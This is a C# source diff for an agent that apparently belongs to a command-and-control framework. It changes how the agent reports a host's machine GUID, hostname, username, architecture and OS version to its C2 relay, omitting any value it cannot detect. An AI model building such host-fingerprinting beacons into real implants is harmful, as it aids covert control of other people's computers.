@@ -1,4 +1,5 @@
 using System;
+using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using Microsoft.Win32;
 
@@ -23,30 +24,44 @@ namespace CSharpAgent
                     "MachineGuid", "") as string ?? "").ToLowerInvariant();
             }
             catch { }
-            // Same validation as the JScript agent: a malformed/absent MachineGuid falls back
-            // to a random GUID (ToString() already emits the 8-4-4-4-12 lowercase shape).
-            if (!LooksLikeGuid(guid)) guid = Guid.NewGuid().ToString();
+            // The machine UUID is nullable: a malformed/absent MachineGuid is NOT replaced
+            // with a random GUID (that fabricated a fresh phantom identity per process) —
+            // the header is simply omitted and the relay treats the agent as identity-less.
+            if (!LooksLikeGuid(guid)) guid = "";
 
             var machineArch = MachineArch();
             var processArch = ProcessArch();
             var version = OsVersion();
 
-            return new[]
+            // REQUIRED headers carry compile-time constants. Every detection-derived field
+            // is OPTIONAL: a value that could not be detected OMITS the header — never sent
+            // as "" — so the relay/C2 see "not reported" instead of a fabricated default.
+            // There is NO Bitness header: the process arch already carries the full width,
+            // and x86_64/aarch64 are both 64-bit — a bare bit flag would say nothing about
+            // which.
+            var headers = new List<string[]>
             {
                 new[] { "X-Agent-Api-Version", "1" },
-                new[] { "X-Agent-Uuid", guid },
-                new[] { "X-Agent-Hostname", Environment.MachineName },
-                new[] { "X-Agent-Username", Environment.UserName },
-                new[] { "X-Agent-Arch", machineArch },
-                new[] { "X-Agent-Process-Arch", processArch },
                 new[] { "X-Agent-Platform", "Windows" },
-                new[] { "X-Agent-Os-Version", version },
-                new[] { "X-Agent-Build", BuildNumber(version) },
-                new[] { "X-Agent-Commit", "" },
                 new[] { "X-Agent-Name-Id", BreedId.ToString() },
-                new[] { "X-Agent-Bitness", processArch == "x86_64" || processArch == "aarch64" ? "64" : "32" },
                 new[] { "X-Agent-Capabilities", Capabilities }
             };
+            AddOptional(headers, "X-Agent-Machine-Uuid", guid);
+            AddOptional(headers, "X-Agent-Hostname", Environment.MachineName);
+            AddOptional(headers, "X-Agent-Username", Environment.UserName);
+            AddOptional(headers, "X-Agent-Arch", machineArch);
+            AddOptional(headers, "X-Agent-Process-Arch", processArch);
+            AddOptional(headers, "X-Agent-Os-Version", version);
+            AddOptional(headers, "X-Agent-Build", BuildNumber(version));
+            return headers.ToArray();
+        }
+
+        /// <summary>Appends an OPTIONAL identity header only when its detection produced a
+        /// value — omission is the wire form of "could not detect" (agents never send empty
+        /// strings or placeholders).</summary>
+        private static void AddOptional(List<string[]> headers, string name, string value)
+        {
+            if (!string.IsNullOrEmpty(value)) headers.Add(new[] { name, value });
         }
 
         private static bool LooksLikeGuid(string value)
